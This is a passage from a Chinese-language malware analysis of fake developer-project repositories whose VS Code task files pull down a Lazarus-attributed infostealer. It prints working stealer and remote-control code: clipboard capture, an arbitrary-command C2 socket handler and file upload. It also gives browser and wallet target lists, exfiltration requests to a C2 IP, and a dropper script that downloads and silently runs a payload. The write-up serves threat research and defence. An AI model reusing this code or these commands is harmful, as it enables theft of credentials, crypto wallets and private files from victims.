[System.Windows.Forms.Clipboard]::GetText();\nif ($clipboard) { $clipboard } else { '' }`;\n      const encodedScript = Buffer.from(psScript, 'utf16le').toString('base64');\n      const content = execSync(\n        `powershell -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedScript}`,\n        { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 10 * 1024 * 1024, windowsHide: true }\n      ).trim();\n      return content;\n    } else if (platform === 'darwin') {\n      const content = execSync('pbpaste', { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] }).trim();\n      return content;\n    } else if (platform === 'linux') {\n      // If running in WSL, use PowerShell to get Windows clipboard\n      if (is_wsl()) {\n        try {\n          const psScript = `Add-Type -AssemblyName System.Windows.Forms;\n$clipboard = [System.Windows.Forms.Clipboard]::GetText();\nif ($clipboard) { $clipboard } else { '' }`;\n          const encodedScript = Buffer.from(psScript, 'utf16le').toString('base64');\n          const content = execSync(\n            `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedScript}`,\n            { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'], maxBuffer: 10 * 1024 * 1024 }\n          ).trim();\n          return content;\n        } catch (e) {\n          // Fallback to Linux clipboard if PowerShell fails\n        }\n      }\n      // Try Linux clipboard tools (xclip/xsel)\n      try {\n        const content = execSync('xclip -selection clipboard -o', { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] }).trim();\n        return content;\n      } catch (e) {\n        try {\n          const content = execSync('xsel --clipboard --output', { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] }).trim();\n          return content;\n        } catch (e2) {\n          // Only throw error if not in WSL (in WSL, we already tried PowerShell)\n          if (!is_wsl()) {\n            throw new Error('xclip or xsel not found. Install one of them: sudo apt-get install xclip');\n          }\n          return null;\n        }\n      }\n    } else {\n      throw new Error(`Unsupported platform: ${platform}`);\n    }\n  } catch (error) {\n    return null;\n  }\n}\nasync function watchClipboard(interval = 500) {\n  let lastContent = '';\n  let isRunning = true;\n  const checkClipboard = async () => {\n    if (!isRunning) return;\n    try {\n      const currentContent = await getClipboardContent();\n      if (currentContent !== null && currentContent !== lastContent && currentContent !== '') {\n        await f_s_l(currentContent);\n        lastContent = currentContent;\n      }\n    } catch (error) {console.log(error);}\n    if (isRunning) {\n      setTimeout(checkClipboard, interval);\n    }\n  };\n  \n  await checkClipboard();\n  \n  process.on('SIGINT', () => {\n    isRunning = false;\n  });\n  \n  process.on('SIGTERM', () => {\n    isRunning = false;\n  });\n}\n\nawait watchClipboard(1000);\n  })();\n})();\n\n";
  try {
    Utils.sp_s(H, "pid." + t + ".3.lock", "socketScript", f_s_l);
  } catch (Y) {}
};
```

---

#### ldbScript（ %TEMP%/pid.[t].1.lock ）

掃描13 種瀏覽器的資料目錄路徑，竊取`Login Data` 、`Login Data For Account`、`Web Data` 、`Local State`，並嘗試解密瀏覽器 Master Key 並解密密碼，解密密碼會存在 s.txt ，瀏覽器路徑包括：

1. Google Chrome
   - Windows: `%LOCALAPPDATA%\Google\Chrome\User Data`
   - macOS: `~/Library/Application Support/Google/Chrome`
   - Linux: `~/.config/google-chrome`

2. Brave

- Windows: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data`
- macOS: `~/Library/Application Support/BraveSoftware/Brave-Browser`
- Linux: `~/.config/BraveSoftware/Brave-Browser`

3. AVG Browser

- Windows: `%LOCALAPPDATA%\AVG Browser\User Data`
- macOS: `~/Library/Application Support/AVG Browser`
- Linux:` ~/.config/avg-browser`

4. Microsoft Edge

- Windows: `%LOCALAPPDATA%\Microsoft\Edge\User Data`
- macOS: `~/Library/Application Support/Microsoft Edge`
- Linux: `~/.config/microsoft-edge`

5. Opera

- Windows: `%LOCALAPPDATA%\Opera Software\Opera Stable`
- macOS: `~/Library/Application Support/com.operasoftware.Opera`
- Linux: `~/.config/opera`

6. Opera GX

- Windows: `%LOCALAPPDATA%\Opera Software\Opera GX`
- macOS: `~/Library/Application Support/com.operasoftware.OperaGX`
- Linux: `~/.config/opera-gx`

7. Vivaldi

- Windows: `%LOCALAPPDATA%\Vivaldi\User Data`
- macOS: `~/Library/Application Support/Vivaldi`
- Linux: `~/.config/vivaldi`

8. Kiwi Browser

- Windows: `%LOCALAPPDATA%\Kiwi Browser\User Data`
- macOS: `~/Library/Application Support/Kiwi Browser`
- Linux: `~/.config/kiwi-browser`

9. Yandex Browser

- Windows: `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data`
- macOS: `~/Library/Application Support/Yandex/YandexBrowser`
- Linux: `~/.config/yandex-browser`

10. Iridium

- Windows: `%LOCALAPPDATA%\Iridium\User Data`=
- macOS: `~/Library/Application Support/Iridium`
- Linux: `~/.config/iridium-browser`

11. Comodo Dragon

- Windows: `%LOCALAPPDATA%\Comodo\Dragon\User Data`
- macOS: `~/Library/Application Support/Comodo/Dragon`
- Linux: `~/.config/comodo-dragon`

12. SRWare Iron

- Windows: `%LOCALAPPDATA%\SRWare Iron\User Data`
- macOS: `~/Library/Application Support/SRWare Iron`
- Linux: `~/.config/srware-iron`

13. Chromium

- Windows: `%LOCALAPPDATA%\Chromium\User Data`
- macOS: `~/Library/Application Support/Chromium`
- Linux: `~/.config/chromium`

掃描錢包擴充套件的 LevelDB，路徑為`{瀏覽器資料}/Default/Local Extension Settings/{錢包ID}/`，錢包套件 ID 包括：

1. MetaMask

   ```
   nkbihfbeogaeaoehlefnkodbefgpgknn
   ```

2. MetaMask Edge

   ```
   ejbalbakoplchlghecdalmeeeajnimhm
   ```

3. Rabby Wallet

   ```
   acmacodkjbdgmoleebolmdjonilkdbch
   ```

4. Phantom

   ```
   bfnaelmomeimhlpmgjnjophhpkkoljpa
   ```

5. TronLinK

   ```
   ibnejdfjmmkpcnlpebklmnkoeoihofec
   ```

6. Exodus

   ```
   egjidjbpglichdcondbcbdnbeeppgdph
   ```

7. Coin98

   ```
   nphplpgoakhhjchkkhmiggakijnkhfnd
   ```

8. Coinbase Wallet

   ```
   omaabbefbmiijedngplfjmnooppbclkk
   ```

9. Solflare Wallet

   ```
   bhhhlbepdkbapadjdnnojkbgioiodbic
   ```

10. Argent X

    ```
    aeachknmefphepccionboohckonoeemg
    ```

11. Keplr

    ```
    aflkmhkiijdbfcmhplgifokgdeclgpoi
    ```

12. Terra Station

    ```
    agoakfejjabomempkjlepdflaleeobhb
    ```

13. Bitget Wallet

    ```
    aholpfdialjgjfhomihkjbmgjidlcdno
    ```

14. Math Wallet

    ```
    afbcbjpbpfadlkmhmclhkeeodmamcflc
    ```

15. Leap Wallet

    ```
    cgbogdmdefihhljhfeffkljbghamglni
    ```

16. Halo Wallet

    ```
    dmkamcknogkgcdfhhbddcghachkejeap
    ```

17. Martian Wallet

    ```
    dlcobpjiigpikoobohmabehhmhfoodbb
    ```

18. Pontem Wallet

    ```
    efbglgofoippbgcjepnhiblaibcnclgk
    ```

19. Lido

    ```
    ejjladinnckdgjemekebdpeokbikhfci
    ```

20. Fewcha Move

    ```
    fhbohimaelbohpjbbldcngcnapndodjp
    ```

21. Petra Wallet

    ```
    fhkbkphfeanlhnlffkpologfoccekhic
    ```

22. OKX Wallet

    ```
    fhmfendgdocmcbmfikdcogofphimnkno
    ```

23. Sender

    ```
    fldfpgipfncgndfolcbkdeeknbbbnhcc
    ```

24. XDEFI Wallet

    ```
    gjnckgkfmgmibbkoficdidcljeaaaheg
    ```

25. Crypto.com DeFi

    ```
    hifafgmccdpekplomjjkcfgodnhcellj
    ```

26. Xverse

    ```
    hmeobnfnfcmdkdcmlblgagmfpfboieaf
    ```

27. Safepal Extension

    ```
    hnfanknocfeofbddgcijnmhnfnkdnaad
    ```

28. Backpack

    ```
    jiidiaalihmmhddjgbnbgdfflelocpak
    ```

29. ONTO Wallet

    ```
    jblndlipeogpafnldhgmapagcccfchpi
    ```

30. Sui Wallet

    ```
    jmbkjchcobfffnmjboflnchcbljiljdk
    ```

31. Blade Wallet

    ```
    jnjpmcgfcfeffkfgcnjefkbkgcpnkpab
    ```

32. Glow Wallet

    ```
    kpkmkbkoifcfpapmleipncofdbjdpice
    ```

33. Nami (Cardano)

    ```
    khpkpbbcccdmmclmpigdgddabeilkdpd
    ```

34. Eternl (CCvault)

    ```
    ldinpeekobnhjjdofggfgjlcehhmanaj
    ```

35. Slope Wallet

    ```
    lgmpcpglpngdoalbgeoldeajfclnhafa
    ```

36. XRP Toolkit

    ```
    mcohilncbfahbmgdjkbpemcciiolgcge
    ```

37. CLV Wallet

    ```
    mopnmbcafieddcagagdcbnhejhlodfdd
    ```

38. Polkadot.js

    ```
    nkklfkfpelhghbidbnpdfhblphpfjmbo
    ```

39. Temple Wallet (Tezos)

    ```
    penjlddjkjgpnkllboccdgccekpkcbin
    ```

40. Ronin Wallet

    ```
    ppbibelpcjmhbdihakflkdcoccbgbkpo
    ```

如果是 MacOS ，則獲取 macOS Keychain

- `${process.env.HOME}/Library/Keychains/login.keychain-db`

如果是 Brave ，則獲取其錢包的 LevelDB

- `{瀏覽器路徑}/{Profile}/Local Storage/leveldb/*`

以上拿到的資訊，會透過以下的方式上傳到 `144.172.107[.]191:8085/upload`，並以每 30 秒執行一次瀏覽器資料竊取，總共執行 10 次迭代，每 3 次迭代會額外執行密碼解密上傳

```http
POST /upload HTTP/1.1
Host: 144.172.107[.]191:8085
Content-Type: multipart/form-data
userkey: 101
hostname: <hostname>
timestamp: <timestamp>
file-metadata: <JSON array>
t: <t>
[FormData with multiple files]
```

---

#### autoUploadScript （ %TEMP%/pid.[t].2.lock ）

進行一次性全硬碟掃描敏感檔案。

掃描路徑包括

| 平台        | 掃描路徑                |
| :---------- | :---------------------- |
| Windows     | 所有磁碟 (A-Z)，C: 最後 |
| macOS/Linux | `$HOME` 目錄            |
| WSL         | `/mnt` (Windows 磁碟)   |

優先目錄

```
Windows:
Desktop, Documents, Downloads, OneDrive, Google Drive, GoogleDrive
macOS/Linux:
Desktop, Documents, Downloads, Library/CloudStorage,
Projects, projects, Development, development,
Code, code, Code Projects, code projects,
source, Source, OneDrive, Google Drive, GoogleDrive
```

排除目錄

```
.quokka, .bash_rc, .bash_sessions, .atom, .zen, thumbnails, .rhinocode,
.codeium, .adobe, .matplotlib, .antigravity, .gemini, .pyenv, .pgadmin,
.ipython, .idlerc, .codex, .qodo, .cups, .n2, .n3, .pki, .ruby,
.vscode-remote, .python, .php, .oh-my-zsh, .nvs, .maven, .jupyter,
.dotnet, assetbundles, .pnpm-store, .rbenv, movies, music, adobe,
package cache, nvidia corporation, saved games, winrar, .cargo, .lingma,
.qoder, .trae-aicc, .vscode-insiders, .avo-code, ubuntu-backup, snap-data,
app-configs, .local, .config, .anydesk, library, programdata, .tmp,
node_modules, npm, .npm, .yarn, yarn.lock, package-lock.json, pnpm-store,
.pnpm, public, static, assets, resources, css, less, scss, sass, stylus,
styles, style, themes, theme, build, dist, out, target, bin, obj, .next,
.nuxt, .output, .vuepress, .vitepress, appdata, program files,
program files (x86), windows, windows.old, system volume information,
$recycle.bin, recovery, perflogs, intel, amd, nvidia, microsoft,
microsoftedgebackup, system, applications, .trash, .spotlight-v100,
.fseventsd, .documentrevisions-v100, .temporaryitems, .vol, cores,
application support, proc, sys, dev, run, boot, lost+found, snap, flatpak,
desktop.ini, thumbs.db, .vscode, .idea, .vs, .eclipse, .settings,
.metadata, .gradle, .mvn, .git, .github, .svn, .hg, .bzr, .cache, cache,
tmp, temp, *~, vendor, vendors, .venv, venv, .conda, anaconda3, miniconda3,
.rustup, .pub-cache, .dart_tool, .m2, .ivy2, .sbt, libs, packages, package,
pkgs, pkg, documentation, examples, example, samples, sample, test, tests,
spec, specs, .ssh, .gnupg, .aws, .docker, .kube, .terraform, .vagrant,
.node-gyp, .nvm, .bun, .deno, .go, .gopath, .gocache, .cursor,
.vscode-server, .claude, .windsurf, .snipaste, .vue-cli-ui, .devctl,
.eigent, fonts, font, icons, icon, wallpaper, wallpapers, background,
backgrounds, locale, locales, _locales, i18n, translations, lang, language,
languages, visual studio code.app, chrome.app, firefox.app, safari.app,
opera.app, brave browser.app, vmware, .vmware, vmware fusion,
vmware fusion.app, vmware workstation, vmware player, vmware vsphere,
vmware vcenter, /applications/vmware, /usr/lib/vmware, /usr/share/vmware,
program files/vmware, program files (x86)/vmware, appdata/local/vmware,
appdata/roaming/vmware, library/application support/vmware, .vmwarevm,
.vmdk, .vmem, .vmsn, .vmsd, .vmx, .vmxf, .nvram, .vmtm, mysql, postgresql,
mongodb, redis, elasticsearch, openzeppelin, prisma, .expo, .svelte-kit,
hooks, .wine, .3T, .gk, .move, .tldrc, .android, .avm, .brownie,
.cocoapods, .zsh_sessions, .pm2, .pyp, .myi, manifest, debug, plugin, plugins
```

目標機敏檔案關鍵字/ 副檔名

- 錢包相關

  ```
  .keystore, phone, database, bank, financ, metamask, phantom, bitcoin,
  ethereum, eth, trust, wallet, coinbase, exodus, ledger, trezor, keystore,
  keyring, keychain, atomic, electrum, mycelium, blockchain, bravewallet,
  rabby, coin98, backpack, core, mathwallet, solflare, glow, keplr, argent,
  martian, petra, binance, okx, crypto, cryptocurrency, hardhat, truffle
  ```

- 私鑰/憑證

  ```
  private, privatekey, private_key, private-key, privkey, priv_key, key,
  keypair, key_pair, key-pair, .pem, .p12, .pfx, .jks, .keys, keys, .p8,
  .p7b, .p7c, .cer, .crt, .cert, cert, .der, id_rsa, id_dsa, id_ecdsa,
  id_ed25519, .pub, .priv
  ```

- 助記詞/種子

  ```
  seed, seedphrase, seed_phrase, seed-phrase, mnemonic, phrase, passphrase,
  pass_phrase, pass-phrase, recovery, recoveryphrase, recovery_phrase,
  recovery-phrase, backup, backupphrase, backup_phrase, backup-phrase,
  12words, 12_words, 12-words, 24words, 24_words, 24-words, bip39, bip44
  ```

- 認證資訊

  ```
  password, passwd, pass, pwd, credential, credentials, auth, authentication,
  token, access_token, refresh_token, api_key, apikey, api-key, apisecret,
  api_secret, api-secret, secret, secrets, secretkey, secret_key, secret-key,
  masterkey, master_key, master-key, masterpassword, master_password,
  master-password
  ```

- 帳號資訊

  ```
  account, accounts, profile, profiles, user, username, user_name, user-name,
  login, signin, sign_in, sign-in, address, addresses, tx, transaction,
  transactions
  ```

- 設定檔

  ```
  .env, env, environment, config, configuration, configure, .conf, .cfg,
  .ini, .properties, .yaml, .yml, .toml
  ```

- 資料庫/文件

  ```
  .db, .sqlite, .sqlite3, .sql, .mdb, .accdb, .dbf, .doc, .docx, .pdf,
  .md, .markdown, .rtf, .odt, .xls, .xlsx, .txt, text, note, notes,
  memo, memos
  ```

- 截圖/媒體

  ```
  screenshot, screen, snapshot, capture, .png, .jpg, .jpeg, .bmp
  ```

- 程式碼/資料

  ```
  .json, .js, .ts, .jsx, .tsx, .csv, .xml
  ```

- 備份/其他敏感

  ```
  .lock, .log, .bak, backup, .old, .orig, .save, .swp, .tmp, tmp, my,
  personal, vault, safe, secure, lock, encrypt, decrypt, signature, sign,
  certificate, identity, session, cookie
  ```

附檔案檔案排除

```
.exe, .dll, .so, .dylib, .bin, .app, .deb, .rpm, .pkg, .dmg, .msi,
.appimage, .lnk, .alias, .desktop, .mp4, .mp3, .avi, .mov, .wmv, .flv,
.mkv, .webm, .wma, .wav, .flac, .aac, .ogg, .m4a, .gif, .tiff, .svg,
.ico, .heif, .tmp, .temp, .swp, .swo, .jar, .war, .ear,
.sublime-project, .sublime-workspace
```

只要一掃描到符合的機敏檔案，會先判斷是否大於5 MB ，如果小於就上傳到 `144[.]172[.]107[.]191:8086/upload`

```http
POST /upload HTTP/1.1
Host: 144.172.107[.]191:8086
Content-Type: multipart/form-data
userkey: 101
hostname: <hostname>
path: <filepath_urlencoded>
t: <t>
[FormData with file]
```

---

#### socketScript ( %TEMP%/pid.[t].3.lock)

這個模組主要進行 C2 控制命令解析與執行

首先會先使用下面的方式對 `114.172.107[.]191:8087/api/notify` 做初始通知

```http
POST /api/notify HTTP/1.1
Host: 144.172.107[.]191:8087
Content-Type: application/json
{
  "ukey": <userkey>,
  "t": <t>,
  "host": "101_<hostname>",
  "os": "<os_type> <os_release>",
  "username": "<username>"
}
```

之後使用 web socket 與`ws://114.172.107[.]191:8087`進行命令傳輸

| 事件             | 方向    | 說明                       |
| :--------------- | :------ | :------------------------- |
| `connect`        | 受害→C2 | 連線成功，開始搜尋 `.env*` |
| `connect_error`  | 受害    | 處理連線錯誤               |
| `whour`          | C2→受害 | C2 查詢身份                |
| `whoIm`          | 受害→C2 | 回報主機資訊               |
| `command`        | C2→受害 | 執行任意命令               |
| `message`        | 受害→C2 | 回傳命令結果               |
| `disconnect`     | 受害    | 斷線處理                   |
| `reconnect`      | 受害    | 重連成功                   |
| `processControl` | C2→受害 | 遠端控制進程               |
| `processStatus`  | 受害→C2 | 回報進程狀態               |

##### Connect / Connet error

連線成功，開始搜尋 `.env*` 並上傳到`http://144.172.107[.]191:8085/api/upload-file`

```javascript
socket.on("connect", () => {
  console.log("✅ Connected to socket server (for file browsing)");

  const status = checkProcessStatus();
  socket.emit("processStatus", status);

  setImmediate(async () => {
    try {
      await ".env";
    } catch (err) {
      console.error("Error searching for .env files:", err.message);
    }
  });
});
socket.on("connect_error", (error) => {
  console.error("❌ Socket connection error:", error.message);
  reject(error);
});
```

HTTP POST請求為

```http
POST /api/upload-file HTTP/1.1
Host: 144.172.107[.]191:8085
Content-Type: application/octet-stream
userkey: 101
t: 1706567890
hostname: <hostname>
path: found..env%2F_Users_victim_project_.env
filename: .env
timestamp: 1706567890
Content-Length: 256
Connection: keep-alive

[.env content]
```

##### whour/whoIm

查詢身份與回報身份

```javascript
socket.on("whour", () => {
  const s_i = gsi();
  socket.emit("whoIm", {
    ukey: 101,
    t: <timestamp>,
    host: "101_" + s_i.host,
    os: s_i.os,
    username: s_i.username,
  });
});
```

##### command/message

執行命令與回報結果

- code 102 : 讀取目錄列表
- code 107 : 讀取並上傳
  - 如果檔案大小大於 1MB : HTTP + WebSocket ，HTTP 路徑為：`http://144.172.107[.]191:8085/api/upload-file`
  - 如果檔案大小大於 1MB : Only Http，HTTP 路徑為：`http://144.172.107[.]191:8085/api/upload-file`

```javascript
socket.on("command", (msg) => {
  try {
    const { message: command, code, cid, sid, path: filePath } = msg;
    if (code === "102" && filePath) {
      try {
        const dirPath = filePath.replace(/\\+$/, "");
        if (fs.existsSync(dirPath)) {
          const stats = fs.statSync(dirPath);
          if (stats.isDirectory()) {
            const items = fs.readdirSync(dirPath, { encoding: "utf8" });

            const result = items.map((item) => {
              const fullPath = path.join(dirPath, item);
              try {
                const itemStats = fs.statSync(fullPath);
                const isDir = itemStats.isDirectory();
                return {
                  name: item,
                  path: fullPath,
                  type: isDir ? "dir" : "file",
                  size: isDir ? null : itemStats.size,
                  date: itemStats.mtime.toLocaleString(),
                };
              } catch (statError) {
                return {
                  name: item,
                  path: fullPath,
                  type: "file",
                  size: null,
                  date: new Date().toLocaleString(),
                };
              }
            });

            socket.emit("message", {
              ...msg,
              result: JSON.stringify(result),
            });
            return;
          }
        }
      } catch (dirError) {
        console.warn(`Failed to read directory: ${dirError.message}`);
      }
    }

    exec(
      command,
      {
        windowsHide: true,
        maxBuffer: 1024 * 1024 * 300,
      },
      async (error, stdout, stderr) => {
        const isWslPermissionError =
          stderr &&
          /Permission denied/i.test(stderr) &&
          stdout &&
          stdout.trim().length > 0;

        if (error && !isWslPermissionError) {
          socket.emit("message", {
            result: error.message,
            ...msg,
            type: "error",
          });
          return;
        }

        if (stderr && !isWslPermissionError) {
          socket.emit("message", {
            result: stderr,
            ...msg,
            type: "stderr",
          });
          return;
        }

        let fileUrl = null;
        let fileContentToSend = stdout;
        const maxSize = 1 * 1024 * 1024;

        if (code === "107" && filePath) {
          try {
            if (fs.existsSync(filePath)) {
              const fileBuffer = fs.readFileSync(filePath);
              const fileSize = fileBuffer.length;

              const uploadResult = await uploadFileToLdb(filePath, fileBuffer);
              if (uploadResult && uploadResult.fileUrl) {
                fileUrl = uploadResult.fileUrl;
              }

              if (fileSize > maxSize) {
                fileContentToSend = null;
                console.log(`File too large, sending URL only: ${fileUrl}`);
              } else {
                fileContentToSend = stdout;
              }
            }
          } catch (readError) {}
        }

        socket.emit("message", {
          ...msg,
          result: fileContentToSend,
          fileUrl: fileUrl,
        });
      },
    );
  } catch (e) {
    socket.emit("message", {
      ...msg,
      result: e.message,
      type: "error",
    });
  }
});
```

HTTP POST 請求為

```http
POST /api/upload-file HTTP/1.1
Host: 144.172.107[.]191:8085
Content-Type: application/octet-stream
userkey: 101
t: <timestamp>
hostname: <hostname>
path: <filepath_urlencoded>
filename: <filename>
timestamp: <timestamp>

[file content]
```

##### disconnet

收到斷線後輸出文字

```javascript
socket.on("disconnect", () => {
  console.log("⚠️ Disconnected from socket server");
});
```

##### reconnect/processStatus

收到 reconnect event 後回傳目前三個模組的狀態

```javascript
socket.on("reconnect", (attemptNumber) => {
  console.log(
    "✅ Reconnected to socket server (attempt " + attemptNumber + ")",
  );
  const status = checkProcessStatus();
  socket.emit("processStatus", status);
});

setInterval(() => {
  if (socket.connected) {
    const status = checkProcessStatus();
    socket.emit("processStatus", status);
  }
}, 10000);

const checkProcessStatus = () => {
  const path = require("path");
  const os = require("os");

  const lockFiles = [
    { type: "ldbScript", file: path.join(os.tmpdir(), `pid.${t}.1.lock`) },
    {
      type: "autoUploadScript",
      file: path.join(os.tmpdir(), `pid.${t}.2.lock`),
    },
    { type: "socketScript", file: path.join(os.tmpdir(), `pid.${t}.3.lock`) },
  ];

  const status = {
    ldbScript: false,
    autoUploadScript: false,
    socketScript: false,
  };

  for (const lockFile of lockFiles) {
    try {
      if (fs.existsSync(lockFile.file)) {
        const lockData = JSON.parse(fs.readFileSync(lockFile.file, "utf8"));
        const pid = lockData.pid;

        try {
          process.kill(pid, 0);
          status[lockFile.type] = true;
        } catch (checkError) {
          try {
            fs.unlinkSync(lockFile.file);
          } catch (e) {}
          status[lockFile.type] = false;
        }
      }
    } catch (e) {
      status[lockFile.type] = false;
    }
  }

  return status;
};
```

##### processControl

控制三個模組 Process ，可以進行開啟或關閉

```javascript
socket.on("processControl", (data) => {
  try {
    const { scriptType, action } = data;

    if (action === "stop") {
      const lockFileMap = {
        ldbScript: path.join(os.tmpdir(), `pid.<t>.1.lock`),
        autoUploadScript: path.join(os.tmpdir(), `pid.<t>.2.lock`),
        socketScript: path.join(os.tmpdir(), `pid.<t>.3.lock`),
      };

      const lockFilePath = lockFileMap[scriptType];
      if (lockFilePath && fs.existsSync(lockFilePath)) {
        try {
          const lockData = JSON.parse(fs.readFileSync(lockFilePath, "utf8"));
          const pid = lockData.pid;
          try {
            process.kill(pid, "SIGTERM");
            setTimeout(() => {
              try {
                process.kill(pid, 0);
                process.kill(pid, "SIGKILL");
              } catch (e) {}
            }, 1000);
            fs.unlinkSync(lockFilePath);
            console.log(`Stopped ${scriptType} (PID: ${pid})`);
          } catch (killError) {
            try {
              fs.unlinkSync(lockFilePath);
            } catch (e) {}
          }
        } catch (e) {
          console.error(`Error stopping ${scriptType}:`, e.message);
        }
      }
    } else if (action === "start") {
      console.log(
        `Start command received for ${scriptType} - manual start required`,
      );
    }

    setTimeout(() => {
      const status = checkProcessStatus();
      socket.emit("processStatus", status);
    }, 500);
  } catch (error) {
    console.error("Error handling process control:", error);
  }
});
```

另外他會拿剪貼簿的內容，並上傳到 `http://144.172.107[.]191:8087/api/log`

```javascript
async function watchClipboard() {
  while (true) {
    const content = getClipboardContent(); // pbpaste / xclip / PowerShell
    if (content !== lastContent) {
      await sendLog(content);
      lastContent = content;
    }
    await sleep(1000);
  }
}
```

HTTP POST 請求為

```http
POST /api/log HTTP/1.1
Host: 144.172.107[.]191:8087
Content-Type: application/json

{
  "ukey": 101,
  "t": <timestamp>,
  "host": "101_<hostname>",
  "os": "<os_type> <os_release>",
  "username": "<username>",
  "message": "<剪貼簿內容>",
  "level": "info",
  "data": {}
}
```

到這邊 Sample 1 的大致執行流程就結束了，總結一下 Sample 1 會做的事情

- 初始讓使用者用vscode 相關 editer 透過 task.json 請求惡意檔案
- 再通過多層 dropper 下載惡意檔案
- 這類的 Sample 的javascript 的檔案大小會特別的大，會在混淆過後的 Javascrpt 中執行主要的惡意行爲
  - 竊取使用者瀏覽器、錢包、機密檔案資料
  - 建立 C2 連線，利用web socket 下達指令
  - C2 : `144.172.107[.]191`

此惡意程式相關報告有

- https://gist.github.com/compustar/035b9417a07ae9c60c717eb38f7d0eaa
  - 這邊報告是在分析這篇分析的是`megaorg996/tokentradingdapp `已經不見但是是Thread 文章最相關的 (megaorg995)，猜測為為Sample 1 變體
  - C2 : `144.172.105[.]122`
  - `144.172.105[.]122` 可以根據 https://raw.githubusercontent.com/stamparm/maltrail/master/trails/static/malware/apt_lazarus.txt ，知道說是 Lazarus 使用

變體：

- `https://github[.]com/0x003-copia/Copia-nft_metaverse_game_platform`
  - 增加了 anti debugger

---

### Sample 2

> 最初分析的是 `IvanJoseph103/Token-Presale-dApp` ，不過他已經消失了，並且在test.json 訪問`https://vscode-project-setting.vercel[.]app/task/mac?token=812` 以及其他架在vercel 也已無法使用，會顯示 This content has been blocked for legal reasons，但是除了架在 vercal 的服務之外都還是活著的，並且有許多相關的 sample 的行為皆類似，因此還是分享分析過程。

網址：`https://github[.]com/IvanJoseph103/Token-Presale-dApp/tree/main`

創建時間：`2025/09/24`

相關的sample

- `https://github[.]com/whoisasx/Elo-assignment/tree/main`

這類的 Sample 在 task.json 時在 github 上看第一眼看會不知道執行了什麼，但是如果將頁面往右滑，就會發現...

<img src="/assets/LinkedinTask.gif" />

訪問後特別的是會進行 JWT token 的驗證，並且JWT token 的有效時間非常短，因此會需要寫腳本快速抓取惡意程式

```bash
#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/Documents"
clear
curl -s -L -o "$HOME/Documents/tokenlinux.sh" "http://vscode-project-setting.vercel.app/task/tokenlinux?token=812&st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjEuMTcyLjg2LjI0NSIsInNlc3Npb25JZCI6IjE5MWEzMWZiLWU4MjYtNDgwMC04M2IzLWJjNmYxMDMxZTZiYiIsInN0ZXAiOjEsInRpbWVzdGFtcCI6MTc2ODcyMTE5Njc3Mywib3JpZ1Rva2VuIjoiODEyIiwiaWF0IjoxNzY4NzIxMTk2LCJleHAiOjE3Njg3MjEzNzZ9.0YjYBtLmI5RcsmKW33fvKEZYER1Zv2jqcAb57q4TfWo"
clear
chmod +x "$HOME/Documents/tokenlinux.sh"
clear
nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

```

```bash
#tokenlinux.sh
#!/bin/bash

# Creating new Info
set -e

OS=$(uname -s)
# Node.js Version
# Get latest Node.js version (from official JSON index)
# LATEST_VERSION="20.11.1"
# if [ "$OS" == "Darwin" ]; then
#     # macOS
#    #     LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json \
#    #     | grep -Eo '"version": *"v[0-9]+\.[0-9]+\.[0-9]+"' \
#    #     | head -1 \
#    #     | sed -E 's/.*"v([^"]+)".*/v\1/')
#         LATEST_VERSION="20.11.1"
# elif [ "$OS" == "Linux" ]; then
#     # Linux
#     LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -oP '"version":\s*"\Kv[0-9]+\.[0-9]+\.[0-9]+' | head -1)
# else
#     exit 1
# fi

# Remove leading "v"
LATEST_VERSION="20.11.1"
NODE_VERSION=${LATEST_VERSION}

NODE_TARBALL="node-v${NODE_VERSION}"
DOWNLOAD_URL=""
NODE_DIR="$HOME/Documents/${NODE_TARBALL}"

# Determine the OS (Linux or macOS)

# Step 1: Set the Node.js tarball and download URL based on the OS
if [ "$OS" == "Darwin" ]; then
   # macOS
   NODE_TARBALL="$HOME/Documents/${NODE_TARBALL}-darwin-x64.tar.xz"
   DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-darwin-x64.tar.xz"
elif [ "$OS" == "Linux" ]; then
   # Linux
   NODE_TARBALL="$HOME/Documents/${NODE_TARBALL}-linux-x64.tar.xz"
   DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz"
else
   exit 1
fi

# Step 2: Check if Node.js is installed
NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")

# Step 3: Determine whether to install Node.js
INSTALL_NODE=1
#if [ -z "$NODE_INSTALLED_VERSION" ]; then
#    INSTALL_NODE=1
#fi

EXTRACTED_DIR="$HOME/Documents/node-v${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"

# ✅ Check if the Node.js folder exists
if [ ! -d "$EXTRACTED_DIR" ]; then
   echo "Error: Node.js directory was not extracted properly. Retrying download and extraction..."

   if [ "$INSTALL_NODE" -eq 1 ]; then
       if ! command -v curl &> /dev/null; then
           wget -q "$DOWNLOAD_URL" -O "$NODE_TARBALL"
       else
           curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
       fi

       if [ -f "$NODE_TARBALL" ]; then
           tar -xf "$NODE_TARBALL" -C "$HOME/Documents"
           rm -f "$NODE_TARBALL"
       fi
   fi
fi

# ✅ Add Node.js to the system PATH (session only)
export PATH="$EXTRACTED_DIR/bin:$PATH"

# Step 7: Verify node & npm
if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
   exit 1
fi

# Use Documents directory for files
USER_HOME="$HOME/Documents"
mkdir -p "$USER_HOME"

BASE_URL="http://vscode-project-setting.vercel.app"

# Step 8: Download files
# Check if curl is available
if ! command -v curl >/dev/null 2>&1; then
   # If curl is not available, use wget
